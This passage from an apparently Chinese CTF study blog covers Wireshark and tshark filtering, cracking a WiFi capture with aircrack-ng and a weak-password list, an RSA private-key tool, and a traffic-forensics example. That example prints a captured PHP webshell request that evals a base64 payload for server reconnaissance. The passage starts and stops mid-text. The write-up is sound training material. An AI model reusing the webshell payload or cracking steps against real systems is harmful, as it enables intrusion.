3128</p><p>Protocol<br>可能的值: ether, fddi, ip, arp, rarp, decnet,lat, sca, moprc, mopdl, tcp and udp，如果没有特别指明是什么协议，则默认使用所有支持的协议。<br>Direction<br>可能的值: src, dst, src and dst, src or dst，如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。<br>Host(s)<br>可能的值： net, port,host, portrange，如果没有指定此值，则默认使用”host”关键字。<br>例如，”src 10.1.1.1”与”src host 10.1.1.1”相同。<br>Logical Operations<br>可能的值：not, and, or<br>否(“not”)具有最高的优先级，或(“or”)和与(“and”)具有相同的优先级<br>“not tcp port 3128 and tcp port23”与”(not tcp port 3128) and tcp port23”相同。</p><p>举例分析：<br>tcp dst port 3128 //目的TCP端口为3128的封包。<br>ip src host 10.1.1.1 //来源IP地址为10.1.1.1的封包。<br>host 10.1.2.3 //目的或来源IP地址为10.1.2.3的封包。<br>src portrange 2000-2500<br>//来源为UDP或TCP，并且端口号在2000至2500范围内的封包<br>not icmp //除了icmp以外的所有封包。</p><p>显示过滤器基础语法<br>Protocol String1 String2 ComparisonOperator Value Logical Operations other expression<br>Protocol<br>可以使用大量位于OSI模型第2至7层的协议。在Expression中可以看到，例如，IP，TCP，DNS，SSH<br>String1，String2<br>可选择显示过滤器右侧表达式，点击父类的+号，然后查看其子类<br>Comparison Oerators<br>可以使用六种比较运算符<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>eq|==|等于|<br>ne|!=|不等于|<br>gt|&gt;|大于|<br>It|&lt;|小于|<br>ge|&gt;=|大于等于|<br>le|&lt;=|小于等于|</p><p>Logical Expressions<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>and|&amp;&amp;|逻辑与<br>or| <code>||</code>|逻辑或<br>xor| <code>^^</code>|逻辑异或<br>not| !|逻辑非</p><p>举例分析：<br>snmp || dns || icmp //显示SNMP或DNS或ICMP封包<br>ip.addr == 10.1.1.1 //显示源或目的IP为10.1.1.1的封包<br>ip.src != 10.1.2.3 and ip.dst!=10.4.5.6 //显示源不为10.1.2.3并且目的不为10.4.5.6的封包<br>tcp.port == 25 //显示来源或目的TCP端口号为25的封包<br>tcp.dport == 25 //显示目的TCP端口号为25的封包</p><p>如果过滤器语法是正确的，表达式背景为<code>绿色</code>，否则为<code>红色</code><br>前文中的wireshark文件还原就可以说是一个很基础的数据包流量分析。</p><h4 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h4><p>这一块是流量包中另一个重点，通过对协议分析，找到题目的关键点，从而对所需要的数据进行提取。</p><p>可以学习一下tshark的使用<br>tshark作为wireshark的命令行版，高效快捷是它的优点，配合其余命令行工具(awk,grep)等灵活使用，可以快速定位，提取数据从而省去了繁杂的脚本编写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用方法：tshark -r *.pcap -Y ** -T fields -e **|***&gt;data</span><br></pre></td></tr></table></figure><h4 id="题目1、MISC-rar"><a href="#题目1、MISC-rar" class="headerlink" title="题目1、MISC.rar"></a>题目1、MISC.rar</h4><blockquote><p>key为文本格式，你找得到吗？</p></blockquote><p>用wireshark打开数据包，在文件 -&gt; 导出对象中，选择HTTP-&gt;保存txt文件</p><h4 id="题目2、A记录（蓝鲸）"><a href="#题目2、A记录（蓝鲸）" class="headerlink" title="题目2、A记录（蓝鲸）"></a>题目2、A记录（蓝鲸）</h4><blockquote><p>他在看什么视频，好像很好看，不知道是什么网站的。 还好我截取了他的数据包，找呀找。 key就是网站名称。格式ctf{key} tip:A记录的第一条。所以答案是</p></blockquote><p>ps:在数据包分析工具中，看到的都是加密后的802.11协议的数据包，而无法看到数据包的原始内容。为了方便分析，aircrack-ng工具包提供了一个专用解密工具airdecap-ng。<strong>kali自带</strong></p><p>1.aircrack-ng shipin.cap -w password.txt<br>2.airdecap-ng shipin.cap -e 0719 -p 88888888<br>3.top1000弱口令<a href="https://www.yesck.com/down/TOP1000password.txt" target="_blank" rel="noopener">下载</a></p><h4 id="题目3、好多苍蝇【蓝鲸】"><a href="#题目3、好多苍蝇【蓝鲸】" class="headerlink" title="题目3、好多苍蝇【蓝鲸】"></a>题目3、好多苍蝇【蓝鲸】</h4><blockquote><p>好多苍蝇啊，吧我的重要文件都爬满了，看不到怎么办？提交格式是flag{xxxx},所以答案是？</p></blockquote><ul><li>738数据包，导出application/octet-stream的数据流，删除(00000160,B)之前的都是不需要的数据，拼接数据。伪加密，foremost分离。<br>Tools：<br>hxD:<a href="https://mh-nexus.de/en/downloads.php?product=HxD20" target="_blank" rel="noopener">下载</a><br>类似软件，了解不推荐<br>winhex:<a href="http://www.x-ways.net/winhex/" target="_blank" rel="noopener">下载</a><br>Notepad++ 16进制编辑功能:<a href="https://sourceforge.net/projects/npp-plugins/files/Hex%20Editor/" target="_blank" rel="noopener">下载UNI</a><br>解压缩后把HexEditor.dll文件复制到安装目录（如Notepad++\plugins），退出需要以十六进制显示时，点击菜单的：【插件】－【Hex-Editor】－【View in Hex】即可。</li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章:"></a>参考文章:</h3><p>1.某大佬给新疆电网培训<a href="[https://www.addon.pub/2018/04/10/CTF%E4%B8%AD%E7%9A%84%E6%9D%82%E9%A1%B9%E5%B0%8F%E7%BB%93/](https://www.addon.pub/2018/04/10/CTF中的杂项小结/">MISC总结</a>)</p><p>2.流量分析–<a href="https://skysec.top/2018/04/21/流量分析-CTF题目实战" target="_blank" rel="noopener">ctf实战</a></p><p>3.流量分析–<a href="https://xz.aliyun.com/t/1960" target="_blank" rel="noopener">HTTP认识</a></p><p>4.蓝鲸安全CTF打卡第一期杂项篇<a href="https://www.jianshu.com/p/84a65b64c742" target="_blank" rel="noopener">WriteUp</a></p><p>5.蓝鲸安全30day打卡<a href="http://codeqi.top/2018/02/06/30-Days/" target="_blank" rel="noopener">Writeup</a></p><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="RSA学习"><a href="#RSA学习" class="headerlink" title="RSA学习"></a>RSA学习</h4><p>从0到1，<a href="http://since1994.cn/?p=164" target="_blank" rel="noopener">基础知识</a></p><h4 id="RSA出题"><a href="#RSA出题" class="headerlink" title="RSA出题"></a>RSA出题</h4><p>参考<a href="https://0verwatch.top/RSA-SimpleLearn.html" target="_blank" rel="noopener">博客</a></p><h4 id="题目1：密钥生成"><a href="#题目1：密钥生成" class="headerlink" title="题目1：密钥生成"></a>题目1：密钥生成</h4><blockquote><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d,格式：key{xxxx}</p></blockquote><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080619.jpg" alt=""></p><ul><li><p>已知p q e 解d <a href="http://since1994.cn/?p=166" target="_blank" rel="noopener">详细讲解</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ed ≡ 1 (mod r)</span><br><span class="line">r = (p-1)(q-1) = 2135733082216268400</span><br><span class="line">ed mod r = 1 mod r</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">r=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>-r*i)%e == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'d:'</span> + <span class="string">'%d'</span> % ((<span class="number">1</span>-r*i)/e))</span><br></pre></td></tr></table></figure><p>使用rsatool.py进行计算，环境kali,python2.X</p><blockquote><p>sudo apt-get install libgmp-dev</p><p>pip install gmpy</p></blockquote><p>python2 rsatool.py -p 473398607161 -q 4511491 -e 17</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> base64, fractions, optparse, random</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der <span class="keyword">import</span> encoder</span><br><span class="line"><span class="keyword">from</span> pyasn1.type.univ <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">PEM_TEMPLATE = <span class="string">'-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n'</span></span><br><span class="line">DEFAULT_EXP = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span><span class="params">(n, d, e)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        quotient, remainder = divmod(t, <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"> </span><br><span class="line">    found = <span class="keyword">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>,n<span class="number">-1</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = pow(a, pow(<span class="number">2</span>, i<span class="number">-1</span>, n) * t, n)</span><br><span class="line">            c2 = pow(a, pow(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"> </span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (<span class="number">-1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    p = fractions.gcd(c1<span class="number">-1</span>, n)</span><br><span class="line">    q = (n / p)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSA</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, p=None, q=None, n=None, d=None, e=DEFAULT_EXP)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Initialize RSA instance using primes (p, q)</span></span><br><span class="line"><span class="string">        or modulus and private exponent (n, d)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"> </span><br><span class="line">        self.e = e</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">and</span> q:</span><br><span class="line">            <span class="keyword">assert</span> gmpy.is_prime(p), <span class="string">'p is not prime'</span></span><br><span class="line">            <span class="keyword">assert</span> gmpy.is_prime(q), <span class="string">'q is not prime'</span></span><br><span class="line"> </span><br><span class="line">            self.p = p</span><br><span class="line">            self.q = q</span><br><span class="line">        <span class="keyword">elif</span> n <span class="keyword">and</span> d:   </span><br><span class="line">            self.p, self.q = factor_modulus(n, d, e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ArgumentError(<span class="string">'Either (p, q) or (n, d) must be provided'</span>)</span><br><span class="line"> </span><br><span class="line">        self._calc_values()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_calc_values</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.n = self.p * self.q</span><br><span class="line"> </span><br><span class="line">        phi = (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>)</span><br><span class="line">        self.d = gmpy.invert(self.e, phi)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># CRT-RSA precomputation</span></span><br><span class="line">        self.dP = self.d % (self.p - <span class="number">1</span>)</span><br><span class="line">        self.dQ = self.d % (self.q - <span class="number">1</span>)</span><br><span class="line">        self.qInv = gmpy.invert(self.q, self.p)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_pem</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Return OpenSSL-compatible PEM encoded key</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> PEM_TEMPLATE % base64.encodestring(self.to_der())</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_der</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Return parameters as OpenSSL compatible DER encoded key</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        seq = Sequence()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, self.n, self.e, self.d, self.p, self.q, self.dP, self.dQ, self.qInv]:</span><br><span class="line">            seq.setComponentByPosition(len(seq), Integer(x))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> encoder.encode(seq)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(self, verbose)</span>:</span></span><br><span class="line">        vars = [<span class="string">'n'</span>, <span class="string">'e'</span>, <span class="string">'d'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            vars += [<span class="string">'dP'</span>, <span class="string">'dQ'</span>, <span class="string">'qInv'</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> vars:</span><br><span class="line">            self._dumpvar(v)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_dumpvar</span><span class="params">(self, var)</span>:</span></span><br><span class="line">        val = getattr(self, var)</span><br><span class="line"> </span><br><span class="line">        parts = <span class="keyword">lambda</span> s, l: <span class="string">'\n'</span>.join([s[i:i+l] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), l)])</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> len(str(val)) &lt;= <span class="number">40</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%s = %d (%#x)\n'</span> % (var, val, val)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%s ='</span> % var</span><br><span class="line">            <span class="keyword">print</span> parts(<span class="string">'%x'</span> % val, <span class="number">80</span>) + <span class="string">'\n'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line"> </span><br><span class="line">    parser.add_option(<span class="string">'-p'</span>, dest=<span class="string">'p'</span>, help=<span class="string">'prime'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-q'</span>, dest=<span class="string">'q'</span>, help=<span class="string">'prime'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-n'</span>, dest=<span class="string">'n'</span>, help=<span class="string">'modulus'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-d'</span>, dest=<span class="string">'d'</span>, help=<span class="string">'private exponent'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-e'</span>, dest=<span class="string">'e'</span>, help=<span class="string">'public exponent (default: %d)'</span> % DEFAULT_EXP, type=<span class="string">'int'</span>, default=DEFAULT_EXP)</span><br><span class="line">    parser.add_option(<span class="string">'-o'</span>, dest=<span class="string">'filename'</span>, help=<span class="string">'output filname'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>, dest=<span class="string">'format'</span>, help=<span class="string">'output format (DER, PEM) (default: PEM)'</span>, type=<span class="string">'choice'</span>, choices=[<span class="string">'DER'</span>, <span class="string">'PEM'</span>], default=<span class="string">'PEM'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-v'</span>, dest=<span class="string">'verbose'</span>, help=<span class="string">'also display CRT-RSA representation'</span>, action=<span class="string">'store_true'</span>, default=<span class="keyword">False</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        (options, args) = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> options.p <span class="keyword">and</span> options.q:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Using (p, q) to initialise RSA instance\n'</span></span><br><span class="line">            rsa = RSA(p=options.p, q=options.q, e=options.e)</span><br><span class="line">        <span class="keyword">elif</span> options.n <span class="keyword">and</span> options.d:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Using (n, d) to initialise RSA instance\n'</span></span><br><span class="line">            rsa = RSA(n=options.n, d=options.d, e=options.e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.print_help()</span><br><span class="line">            parser.error(<span class="string">'Either (p, q) or (n, d) needs to be specified'</span>)</span><br><span class="line"> </span><br><span class="line">        rsa.dump(options.verbose)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> options.filename:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Saving %s as %s'</span> % (options.format, options.filename)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> options.format == <span class="string">'PEM'</span>:</span><br><span class="line">                data = rsa.to_pem()</span><br><span class="line">            <span class="keyword">elif</span> options.format == <span class="string">'DER'</span>:</span><br><span class="line">                data = rsa.to_der()</span><br><span class="line"> </span><br><span class="line">            fp = open(options.filename, <span class="string">'wb'</span>)</span><br><span class="line">            fp.write(data)</span><br><span class="line">            fp.close()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">except</span> optparse.OptionValueError, e:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        parser.error(e.msg)</span><br></pre></td></tr></table></figure></li></ul><h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p>1.CTFwiki–<a href="https://wiki.x10sec.org/crypto/introduction/" target="_blank" rel="noopener">密码学部分</a></p><p>2.RSA介绍–<a href="https://www.jianshu.com/p/0c4943d7ea2d" target="_blank" rel="noopener">总结</a></p><h2 id="day02–Danie1"><a href="#day02–Danie1" class="headerlink" title="day02–Danie1"></a>day02–Danie1</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><hr><p>在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件，参赛选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索。 </p><p>pcap流量包的分析通常都是通过图形化的网络嗅探器——wireshark进行的，这款嗅探器经过众多开发者的不断完善，现在已经成为使用最为广泛的安全工具之一。</p><p>Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。</p><h3 id="经典题型"><a href="#经典题型" class="headerlink" title="经典题型"></a>经典题型</h3><ul><li>CTF题型主要分为流量包修复、WEB流量包分析、USB流量包分析和其他流量包分析。</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul><li><p>流量包修复</p><p>比赛中可能会出现通过wireshark打开题目给的流量包后提示包异常的情况，如图</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080601.png" alt=""></p></li><li><p>思路</p><ul><li>在线修复网站：<a href="http://f00l.de/hacking/pcapfix.php" target="_blank" rel="noopener">http://f00l.de/hacking/pcapfix.php</a></li></ul></li><li><p>题目</p><p>第一届 “百度杯” 信息安全攻防总决赛 线上选拔赛：find the flag</p><p>pacp文件地址：<a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap" target="_blank" rel="noopener">https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap</a></p></li><li><p>解题思路：</p><ul><li><p>在线修复，修复完毕后用wireshark打开，查找分组字节流-字符串-flag</p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080602.png" alt=""></p></li></ul></li></ul><ul><li><p>看到where is the flag？继续查看下一个数据包</p></li><li><p>发现两个包id对应的字段刚好是flag</p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080603.png" alt=""></p></li></ul><ul><li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080604.png" alt=""></li></ul><ul><li><p>按照同样的方式连接后面相连数据包的id字段，找到最终的flag</p><p><code>flag{aha!_you_found_it!}</code></p></li></ul><ul><li><p>基本的流量包分析</p></li><li><p>question</p><p>题目  test3.pcapng</p></li><li><p>question</p><p>题目 test.pcapng</p></li><li><p>question</p><p>题目链接：链接: <a href="https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg" target="_blank" rel="noopener">https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg</a>  密码: l43q</p></li></ul><p>  解题思路：wireshark打开流量包</p><p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080605.png" alt=""></p><p>  可以看到User和pass，且都是base64编码</p><p>  解码可以得到</p><p>  user:<a href="mailto:test@51elab.com" target="_blank" rel="noopener">test@51elab.com</a></p><p>  passwd:FLAG:ISCCTESTpas</p><ul><li><p>question</p><p>题目链接：链接: <a href="https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg" target="_blank" rel="noopener">https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg</a>  密码: 9r2i</p></li></ul><p>​      解题思路：wireshark打开流量包，追踪tcp流，在第二个流中发现flag</p><p>​         <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080606.png" alt=""></p><ul><li><p>question</p><p>题目链接：链接: <a href="https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A" target="_blank" rel="noopener">https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A</a>  密码: wk6w</p></li></ul><p>  解题思路：wireshark打开流量包，过滤显示http协议包</p><p> <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080607.png" alt=""></p><p>  发现不停的向一个目录post数据，猜测有人在上传一句话</p><p>  追踪tcp流，发现</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure><p>  先进行url解码，再进行base64解码，得到</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">  </span><br><span class="line">@ini_set(“display_errors”,”0″);</span><br><span class="line">  </span><br><span 